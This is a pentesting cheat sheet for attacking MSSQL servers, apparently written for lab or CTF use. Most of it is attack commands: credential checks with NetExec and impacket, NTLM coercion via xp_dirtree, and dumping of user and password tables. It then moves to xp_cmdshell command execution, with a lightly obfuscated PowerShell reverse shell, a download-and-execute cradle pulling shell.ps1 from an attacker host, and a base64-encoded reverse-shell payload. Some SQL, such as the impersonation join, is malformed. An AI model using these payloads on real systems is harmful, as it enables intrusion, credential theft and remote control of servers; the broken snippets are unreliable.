---
icon: comment-sms
---

# MSSQL server

### Background

***

MSSQL is a relational database management system developed by microsoft. It uses SQL to store and retrieve data. It is widely used for various applications.

#### MSSQL Local Authentication

When using Local Authentication, logins are created in SQL server that aren't based on windows accounts. In this mode of authentication, both the username and the password are created by SQL Server and are stored in SQL Server. Users connecting with Local Auth must provide their credentials every time they login.

#### MSSQL Windows Authentication

When a user connects through a windows user account, SQL Server validates the username and the password with the windows principal token present in the OS. In simple words, Windows validates the authentication. SQL Server doesn't perform the identity validation, it trusts the credentials provided by Windows. Windows Authentication uses NTLM or kerberos. In windows authentication, logins are based on windows user accounts.

### **Checking Access**

***

#### **User and password**

```jsx
# with NetExec (Windows Auth)
nxc mssql $TARGETIP -u $USER -p $PASSWORD

# with NetExec (Local Auth)
nxc mssql $TARGETIP -u $USER -p $PASSWORD --local-auth

# with impacket-mssqlclient (USE SQL Auth)
mssqlclient.py $DOMAIN/$USER:$PASSWORD@$IP

# with impacket-mssqlclient (USE Windows Auth)
mssqlclient.py $DOMAIN/$USER:$PASSWORD@$IP -windows-auth
```

#### **Kerberos authentication**

```jsx
# With NetExec
nxc mssql $TARGETIP -k --use-kcache

# impacket-mssql
mssqlclient.py 'domain.com/username@IP' -k -no-pass -dc-ip $IP
```

#### **User Impersonation**

```jsx
-- Identifying users we can impersonate
SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
```

```jsx
-- Verifying Our Current User and Role
SELECT SYSTEM_USER;
SELECT IS_SRVROLEMEMBER('sysadmin'); -- returns 0 if not a sysadmin and 1 if sysadmin
```

#### **xp\_dirtree**

```jsx
-- Local File Read
EXEC xp_dirtree C:\\
```

```jsx
-- NTLM Coercion
EXEC xp_dirtree '\\\\10.10.11.89\\', 1;
EXEC xp_dirtree '\\\\10.10.14.12\\shares', 1;
sudo responder -I or sudo smbserver.py smbFolder . -smb2support
```

#### This file has logs from the SQL server

```jsx
C:\\SQLServer\\Logs>
```

#### **Database Enumeration;**

```jsx
-- Listing Databases
SELECT name FROM sys.databases;
```

```jsx
-- Server Logins
SELECT name FROM sys.server_principals;
```

```jsx
-- Database principals
SELECT name FROM sys.database_principals;
```

```jsx
-- Listing Databases
SELECT name FROM master.sys.databases
```

```jsx
use db name
-- Finding word start with u something like username
SELECT name FROM sysobjects WHERE xtype = 'U'
```

```jsx
-- it will lits all the tables 
SELECT table_name FROM information_schema.tables;

```

```jsx
-- select the tables
SELECT Username, Password FROM blog_Orchard_Users_UserPartRecord;

```

#### Cmd injection to RCE

```jsx
-- Enable the injection 
enable_xp_cmdshell 
```

```jsx
-- Whoami
xp_cmdshell whoami
```

so in this we can’t use normal powershell payload

why because of firewall so in this we have to use custom shell

for that we we will do this first

```jsx
$low = New-Object System.Net.Sockets.TCPClient("10.10.0.0",4444)
$hii = $low.GetStream()
[byte[]]$hlo = 0..65535|%{0}

while(($i = $hii.Read($hlo, 0, $hlo.Length)) -ne 0){
    $daata = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($hlo,0,$i)
    $supuji = (iex $daata 2>&1 | Out-String)
    $supuji2 = $supuji + "UDU >" 
    $yoo = ([text.encoding]::ASCII).GetBytes($supuji2)
    $hii.Write($yoo,0,$yoo.Length)
    $hii.Flush()
}
$low.Close()
```

this is power shell obfuscation

so now how to use this

```jsx
-- Base64 encdoe to bypass firewall
echo "IEX(New-Object Net.WebClient).DownloadString('<http://10.10.0.0/shell.ps1>')" | iconv -t UTF-16LE | base64 -w0 
```

```jsx
-- Cmd injection 
EXEC xp_cmdshell 'powershell -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AOQAiACwAOQAwADAAMQApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=';
```

```jsx
-- with out base64 if this works
xp_cmdshell powershell IEX(New-Object Net.WebClient).downloadstring(\\"<http://10.10.0.0/shell.ps1\\>")
```

#### **RID BruteForce**

```jsx
nxc mssql $TARGETIP -u $USER -p $PASSWORD --local-auth --rid-brute
```

### **Abusing Linked Servers:**

```jsx
-- Identifying Linked Servers
SELECT srvname, isremote FROM sysservers;
```

```jsx
-- EXECUTING COMMANDS on a Linked Server
EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT ['linked.server'];
```

```jsx
-- impacket
enum_links
use_link "linked_server"
```

### **Read Local Files:**

```jsx
SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents;
```

